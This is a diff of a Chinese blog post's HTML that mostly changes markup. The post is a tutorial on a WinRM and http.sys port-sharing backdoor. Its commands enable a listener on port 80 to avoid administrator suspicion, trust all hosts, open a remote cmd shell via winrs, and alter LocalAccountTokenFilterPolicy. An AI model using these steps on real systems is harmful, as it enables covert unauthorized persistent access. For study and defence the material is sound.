@@ -205,9 +205,9 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             <h1 id="利用http-sys端口复用实现后门"><a href="#利用http-sys端口复用实现后门" class="headerlink" title="利用http.sys端口复用实现后门"></a>利用http.sys端口复用实现后门</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这个后门的基本原理是用<code>Windows</code>的远程管理管理服务<code>WinRM</code>配合<code>http.sys</code>端口复用的特性实现正向连接的后门</p>
-<h2 id="http-sys"><a href="#http-sys" class="headerlink" title="http.sys"></a>http.sys</h2><p>简介<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP.sys是仅在Windows上运行的ASP.NET Core的web服务器。HTTP.sys是Kestrel服务器的替代品，它提供了Kestrel没有提供的一些功能。</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p><code>http.sys</code>支持的系统<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. Windows 7 or later</span><br><span class="line">2. Windows Server 2008 R2 or later</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p><code>HTTP.sys</code>支持以下特性：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Windows Authentication</span><br><span class="line">2. Port sharing</span><br><span class="line">3. HTTPS with SNI</span><br><span class="line">4. HTTP/2 over TLS (Windows 10 or later)</span><br><span class="line">5. Direct file transmission</span><br><span class="line">6. Response caching</span><br><span class="line">7. WebSockets (Windows 8 or later)</span><br></pre></td></tr></tbody></table></figure><p></p>
+<h2 id="http-sys"><a href="#http-sys" class="headerlink" title="http.sys"></a>http.sys</h2><p>简介<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP.sys是仅在Windows上运行的ASP.NET Core的web服务器。HTTP.sys是Kestrel服务器的替代品，它提供了Kestrel没有提供的一些功能。</span><br></pre></td></tr></table></figure></p>
+<p><code>http.sys</code>支持的系统<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. Windows 7 or later</span><br><span class="line">2. Windows Server 2008 R2 or later</span><br></pre></td></tr></table></figure></p>
+<p><code>HTTP.sys</code>支持以下特性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Windows Authentication</span><br><span class="line">2. Port sharing</span><br><span class="line">3. HTTPS with SNI</span><br><span class="line">4. HTTP/2 over TLS (Windows 10 or later)</span><br><span class="line">5. Direct file transmission</span><br><span class="line">6. Response caching</span><br><span class="line">7. WebSockets (Windows 8 or later)</span><br></pre></td></tr></table></figure></p>
 <p>其中<code>Port sharing</code>就是我们要利用<code>http.sys</code>的特性之一端口复用，所有基于<code>HTTP.sys</code>驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可，使用<code>netsh http show servicestate</code>命令可以查看所有在<code>HTTP.sys</code>上注册过的url前缀。</p>
 <h3 id="开启WinRM服务"><a href="#开启WinRM服务" class="headerlink" title="开启WinRM服务"></a>开启<code>WinRM</code>服务</h3><ol>
 <li><code>Windows Server 2012</code>及以上默认是开启<code>WinRM</code>服务的</li>
@@ -216,15 +216,15 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122213210-9778fbb4-3d1b-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122213210-9778fbb4-3d1b-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<h2 id="添加80端口Listener"><a href="#添加80端口Listener" class="headerlink" title="添加80端口Listener"></a>添加80端口Listener</h2><p> <code>Windows 2012</code>及以上就只需要执行一条命令就可以实现：<code>winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}</code></p>
+<h2 id="添加80端口Listener"><a href="#添加80端口Listener" class="headerlink" title="添加80端口Listener"></a>添加80端口Listener</h2><p> <code>Windows 2012</code>及以上就只需要执行一条命令就可以实现：<code>winrm set winrm/config/service @{EnableCompatibilityHttpListener=&quot;true&quot;}</code></p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122215742-289ec85a-3d1f-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122215742-289ec85a-3d1f-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -232,7 +232,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122220258-e4d3b512-3d1f-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122220258-e4d3b512-3d1f-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -240,36 +240,36 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122220929-ce714b1c-3d20-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122220929-ce714b1c-3d20-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>这就会让管理员起疑心，所以我们就要修改一下<code>WinRM</code>的端口，通过下面这条命令把<code>WinRM</code>的端空改为80端口：<br><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}</code></p>
+<p>这就会让管理员起疑心，所以我们就要修改一下<code>WinRM</code>的端口，通过下面这条命令把<code>WinRM</code>的端空改为80端口：<br><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=&quot;80&quot;}</code></p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122221308-50a1d19c-3d21-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122221308-50a1d19c-3d21-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <h2 id="本地连接配置"><a href="#本地连接配置" class="headerlink" title="本地连接配置"></a>本地连接配置</h2><p>本地配置执行以下两条命令即可，执行以下两条命令即可。</p>
 <ol>
 <li>开启接<code>WinRM</code>服务：<code>winrm quickconfig -q</code></li>
-<li>设置信任连接的主机：<code>winrm set winrm/config/Client @{TrustedHosts="*"}</code></li>
+<li>设置信任连接的主机：<code>winrm set winrm/config/Client @{TrustedHosts=&quot;*&quot;}</code></li>
 </ol>
-<p>然后我们就可以使用<code>winrs</code>命令连接远程<code>WinRM</code>服务执行命令即可<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.141.148 -u:administrator -p:qiyou whoami</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>然后我们就可以使用<code>winrs</code>命令连接远程<code>WinRM</code>服务执行命令即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.141.148 -u:administrator -p:qiyou whoami</span><br></pre></td></tr></table></figure></p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122221950-404e6f34-3d22-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122221950-404e6f34-3d22-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>返回交互式shell<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.141.148 -u:administrator -p:qiyou cmd</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>返回交互式shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.141.148 -u:administrator -p:qiyou cmd</span><br></pre></td></tr></table></figure></p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122222923-95aa8d90-3d23-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122222923-95aa8d90-3d23-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -277,38 +277,20 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122224651-06c50a12-3d26-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122224651-06c50a12-3d26-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>需要修改以下注册表，PS：修改之后不需要重启<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>需要修改以下注册表，PS：修改之后不需要重启<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></p>
 <p>修改之后就可以成功登陆了</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122224859-52946618-3d26-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122224859-52946618-3d26-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
+
         </div>
 
         <blockquote class="post-copyright">
